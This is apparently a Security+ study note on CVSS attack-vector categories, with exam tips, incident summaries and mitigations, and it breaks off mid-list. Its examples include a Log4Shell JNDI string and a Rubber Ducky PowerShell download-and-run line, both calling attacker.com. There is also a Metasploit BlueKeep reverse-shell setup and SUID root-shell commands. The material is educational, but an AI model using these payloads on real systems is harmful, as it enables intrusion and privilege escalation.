---
domain: "attack"
tags: [attack-vector, threat-modeling, vulnerability, exploitation, security-fundamentals, cvss]
---
# Attack Vector

An **attack vector** is the specific path, method, or mechanism by which a threat actor gains unauthorized access to a target system, network, or data. In the context of [[Vulnerability Management]] and [[Threat Modeling]], attack vectors are formally classified and scored to quantify exploitability. Understanding attack vectors is foundational to [[Defense in Depth]] because defenders must anticipate *how* an attacker will approach a target before they can build effective countermeasures.

---

## Overview

The concept of an attack vector exists to provide a structured vocabulary for describing *how* exploitation occurs, independent of *what* is being exploited. Without this classification, security teams would struggle to prioritize remediation — a remotely exploitable vulnerability with no authentication requirement is fundamentally more dangerous than one requiring physical access and administrative credentials. The formalization of attack vectors is most rigorously codified in the [[CVSS (Common Vulnerability Scoring System)]], which uses the Attack Vector metric as one of its core base score components.

In CVSS v3.x, attack vectors are divided into four categories in ascending order of physical proximity required: **Network (N)**, **Adjacent (A)**, **Local (L)**, and **Physical (P)**. Each category reflects the attacker's required "distance" from the target. Network-based vulnerabilities, like [[Log4Shell (CVE-2021-44228)]] or [[EternalBlue (MS17-010)]], receive the highest exploitability scores because any internet-connected attacker can attempt them without physical proximity. Physical attack vectors, by contrast, require hands-on access to a device — such as inserting a malicious [[USB Drop Attack]] device or performing a [[Cold Boot Attack]].

Beyond the CVSS taxonomy, the security industry uses "attack vector" more broadly to describe entire categories of attack methodology. In this broader sense, attack vectors include phishing emails, vulnerable web application endpoints, unpatched software, misconfigured cloud storage buckets, supply chain compromises, rogue Wi-Fi access points, and insider threats. Each of these represents a distinct pathway that bypasses or undermines a specific layer of security control. The [[MITRE ATT&CK Framework]] maps these real-world attack vectors to specific tactics and techniques observed in documented threat actor campaigns.

The lifecycle of an attack vector typically follows a recognizable pattern: discovery (the attacker identifies the attack surface), weaponization (they develop or acquire an exploit), delivery (they transmit the payload via the vector), and exploitation (successful compromise). This maps directly to the [[Cyber Kill Chain]] and [[MITRE ATT&CK]] initial access tactics. Understanding this lifecycle helps defenders instrument the correct detection controls at each stage — for example, email filtering disrupts phishing vectors at the delivery stage, while network segmentation limits lateral movement after initial exploitation.

Attack vectors are also dynamic. Vectors that were theoretical become practical as new tools lower the skill barrier, and vectors that were common become rare as the industry deploys effective countermeasures. The shift from on-premises to cloud infrastructure, for instance, has elevated misconfiguration and credential-based attacks while reducing the prevalence of certain network-layer exploits that are filtered by cloud provider edge infrastructure.

---

## How It Works

### The Four CVSS v3.x Attack Vector Categories

The CVSS specification provides the most operationally precise definition of attack vectors. Understanding each category is essential for both exam success and real-world triage.

#### 1. Network (AV:N) — Remotely Exploitable
The vulnerability can be exploited over a routed network path. The attacker does not need to be on the same logical segment as the target. This is the highest-risk category.

**Example: CVE-2021-44228 (Log4Shell)**
```
# Attacker sends a malicious JNDI lookup string in any logged field
# (e.g., HTTP User-Agent header)

User-Agent: ${jndi:ldap://attacker.com:1389/exploit}

# The vulnerable Log4j library processes the string, initiates an
# outbound LDAP connection to the attacker's server, and loads
# a remotely-supplied Java class — achieving Remote Code Execution (RCE)
```
This attack traverses the open internet. The attacker and victim have zero physical proximity. AV:N score contribution is maximum.

#### 2. Adjacent (AV:A) — Network-Adjacent
The attacker must be on the same network segment, broadcast domain, or logical adjacency as the target. This includes the same Wi-Fi network, VLAN, Bluetooth range, or direct physical subnet.

**Example: CVE-2019-0708 (BlueKeep — when constrained to LAN)**
Some wormable vulnerabilities only propagate within a subnet. An attacker on the same guest Wi-Fi network could exploit a vulnerable RDP service on another guest's machine:
```
# BlueKeep exploit (Metasploit module)
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS 192.168.1.45   # Target on same subnet
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
run
```
ARP poisoning, rogue DHCP, and Wi-Fi deauthentication attacks are also AV:A by nature because they require broadcast domain access.

#### 3. Local (AV:L) — Requires Local Access
The attacker must be logged into the system (interactively or via SSH/RDP) or must be able to cause a local user to execute malicious content (e.g., opening a malicious file).

**Example: Linux Privilege Escalation via SUID Binary**
```bash
# Attacker has a low-privilege shell on the target
# Finds SUID binaries that can be exploited
find / -perm -4000 -type f 2>/dev/null

# Example: exploiting a vulnerable SUID version of nmap (older versions)
nmap --interactive
!sh
# Spawns root shell because nmap runs as root via SUID bit

# Or using GTFOBins technique with a misconfigured find binary:
find . -exec /bin/sh -p \; -quit
```
Local kernel exploits (e.g., Dirty COW — CVE-2016-5195) also fall here: the attacker needs a foothold on the system first.

#### 4. Physical (AV:P) — Requires Physical Presence
The attacker must physically interact with the hardware.

**Example: Evil Maid Attack / USB Rubber Ducky**
```
# A Rubber Ducky payload auto-types commands when plugged into a USB port
# payload.txt on the Ducky:
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"
ENTER
```
BIOS/UEFI attacks, hardware implants, and direct memory access (DMA) attacks via Thunderbolt (Thunderspy) are also physical attack vectors.

### Delivery Mechanism Breakdown

Beyond CVSS taxonomy, common delivery-level attack vectors include:

| Vector | Protocol/Port | Example Technique |
|---|---|---|
| Email Phishing | SMTP TCP/25, 587 | Malicious attachment, credential harvesting link |
| Web Application | HTTP/HTTPS TCP/80, 443 | SQLi, XSS, deserialization |
| RDP Brute Force | TCP/3389 | Credential stuffing, BlueKeep |
| SMB Exploit | TCP/445 | EternalBlue, pass-the-hash |
| DNS Poisoning | UDP/53 | Cache poisoning, BGP hijack |
| Supply Chain | N/A | SolarWinds SUNBURST, XZ Utils backdoor |
| Physical Media | N/A | USB drop, rogue hardware |

---

## Key Concepts

- **Attack Vector (CVSS)**: The formal metric in [[CVSS (Common Vulnerability Scoring System)]] that describes the network context required for exploitation; values are Network, Adjacent, Local, and Physical, with decreasing exploitability score contribution respectively.

- **Attack Surface**: The sum total of all possible attack vectors into a system — every exposed port, every running service, every user account, and every third-party dependency. Reducing attack surface is a primary goal of [[Hardening]]; attack vector is the method of traversal across that surface.

- **Initial Access (MITRE ATT&CK TA0001)**: The [[MITRE ATT&CK Framework]] tactic that maps directly to attack vector delivery — it includes techniques such as Spearphishing Attachment (T1566.001), Exploit Public-Facing Application (T1190), and Valid Accounts (T1078).

- **Weaponization**: The second phase of the [[Cyber Kill Chain]] in which an attacker packages an exploit for delivery through a chosen attack vector — for example, embedding a malicious macro in a Word document for delivery via phishing email.

- **Lateral Movement Vector**: A secondary attack vector used *after* initial compromise to move from one internal host to another, exploiting trust relationships, stolen credentials, or unpatched internal services — distinct from the initial access vector.

- **Zero-Day Attack Vector**: An attack that exploits an unknown or unpatched vulnerability, meaning no signature or patch exists at the time of exploitation; these are the most dangerous vectors because standard patch-based defenses fail entirely.

- **Living off the Land (LotL)**: A technique in which attackers use legitimate, pre-installed system tools (e.g., `PowerShell`, `wmic`, `certutil`) as their attack vector for execution and persistence, bypassing AV detection by avoiding malicious binaries.

---

## Exam Relevance

The Security+ SY0-701 exam tests attack vector knowledge heavily, particularly through scenario-based questions. Key exam-specific points:

**CVSS Attack Vector Ordering**: The exam expects you to know the four CVSS AV values and their relative risk ranking. Remember: **N > A > L > P** (Network is highest risk, Physical is lowest). A common distractor presents a physical attack vector as "more dangerous" — it is not, from an exploitability standpoint, because it requires the most access.

**Attack Vector vs. Attack Surface**: The exam distinguishes these terms. *Attack surface* is the total exposure; *attack vector* is a specific pathway. Questions may ask which control reduces the attack surface (disabling unused services, closing ports) vs. which blocks a specific attack vector (patching a specific CVE, filtering email attachments).

**Objective Mapping**: Attack vectors appear in multiple exam objectives:
- **1.2**: Summarize types of malware and attack techniques (delivery vectors)
- **2.2**: Explain vulnerability scanning (CVSS scores use AV)
- **4.1**: Apply threat intelligence to support organizational security (understanding how attackers gain access)

**Common Question Patterns**:
- "A vulnerability has AV:N/AC:L/PR:N/UI:N — what does this tell you?" → Remotely exploitable, low complexity, no privileges needed, no user interaction = CRITICAL, patch immediately.
- "An attacker exploited a vulnerability that required them to be on the same Wi-Fi segment. What CVSS AV value applies?" → Adjacent (AV:A).
- "Which attack vector is used when an attacker sends a malicious PDF via email?" → Network/Email-based vector for initial delivery; Local execution vector for the document exploit itself.

**Gotchas**:
- Do not confuse **attack vector** with **attack surface** — know both definitions cold.
- Physical attacks score *lower* in CVSS despite being scary in narrative scenarios.
- The exam may use "vector" loosely to mean delivery mechanism; context is everything.

---

## Security Implications

### Real-World Incidents

**Log4Shell (CVE-2021-44228) — AV:N, CVSS 10.0**
Disclosed December 2021, this vulnerability in the Apache Log4j logging library affected millions of Java applications. The attack vector was any text field that got logged — HTTP headers, usernames, search queries. Attackers worldwide exploited it within hours of disclosure to deploy ransomware, cryptominers, and [[Cobalt Strike]] beacons. The network attack vector meant any internet-facing application using Log4j was immediately at risk with zero user interaction required.

**EternalBlue (MS17-010) — AV:N via SMB**
Developed by the NSA and leaked by Shadow Brokers in 2017. The attack vector is the SMBv1 protocol on TCP/445. Used in the [[WannaCry]] ransomware attack (May 2017) and [[NotPetya]] (June 2017), causing estimated damages of $10 billion globally. The network attack vector allowed self-propagating worms to spread across unpatched networks at machine speed with no user interaction.

**SolarWinds SUNBURST (2020) — Supply Chain Vector**
Attackers compromised SolarWinds' build pipeline to inject malicious code into legitimate software updates. The attack vector was the software update mechanism itself — a trusted channel. Approximately 18,000 organizations installed the backdoored Orion update, including multiple US federal agencies. This illustrates that attack vectors extend beyond technical vulnerabilities to process and trust relationship exploitation.

**Thunderspy (2020) — Physical AV:P**
Researcher Björn Ruytenberg demonstrated that Thunderbolt-enabled PCs could be compromised in under 5 minutes of physical access using direct memory access (DMA) attacks, bypassing full-disk encryption and lock screens. This is a pure physical attack vector — devastating for unattended devices but mitigated entirely by physical security controls.

### Detection Indicators
- Unusual outbound connections from internal servers (Network AV)
- ARP table anomalies or DHCP rogue activity (Adjacent AV)
- Privilege escalation events in OS audit logs (Local AV)
- USB device insertion logs (Physical AV)

---

## Defensive Measures

### Network Attack Vector Mitigations
- **Patch Management**: Eliminate known network-exploitable vulnerabilities within SLA windows (critical: 24-72 hours). Use tools like [[Nessus]], [[Qualys]], or [[OpenVAS]] to identify AV:N vulnerabilities in your environment.
- **Firewall Rules**: Block unnecessary inbound services at the perimeter. If SMB (TCP/445) doesn't need to be internet-facing, it must not be. Use `ufw`, `iptables`, or enterprise [[Next-Generation Firewall (NGFW)]] with application-layer inspection.
- **Web Application Firewall (WAF)**: Deploy a [[WAF]] to filter malicious HTTP/HTTPS traffic targeting web application attack vectors (SQLi, XSS, deserialization).

```bash
# UFW example: block SMB from internet-facing interface
sudo ufw deny in on eth0 to any port 445
sudo ufw deny in on eth0 to any port 139
```

### Adjacent Attack Vector Mitigations
- **Network Segmentation / VLANs**: Isolate untrusted devices (guest Wi-Fi, IoT) into separate broadcast domains. Adjacent exploitation requires shared network adjacency — remove that adjacency.
- **802.1X Port Authentication**: Authenticate devices before granting network access, preventing rogue device insertion.
- **Private VLANs (PVLANs)**: Prevent host-to-host communication within the same VLAN even if they share the same subnet.

### Local Attack Vector Mitigations
- **Principle of Least Privilege**: Users and processes operate with minimum necessary permissions. Limits the damage from local privilege escalation vectors.
- **Disable SUID/SGID unnecessarily**: Audit setuid binaries regularly.
```bash
# Audit SUID binaries
find / -perm /4000 -ls 2>/dev/null | grep -v "^find"
```
- **AppArmor / SELinux**: Mandatory access control frameworks that confine process behavior even if an attacker achieves local code execution.

### Physical Attack Vector Mitigations
- **USB Port Control**: Disable USB ports via BIOS/UEFI or endpoint management (e.g., Group Policy, `udev` rules in Linux). Deploy tools like USBGuard.
```bash
# Install and configure USBGuard (Linux)
sudo apt install usbguard
sudo usbguard generate-policy > /etc/usbguard/rules.conf
sudo systemctl enable --now usbguard
```
- **Full Disk Encryption**: [[BitLocker]], [[LUKS]], or [[VeraCrypt]] protect data from physical access attacks (evil maid, theft).
- **BIOS/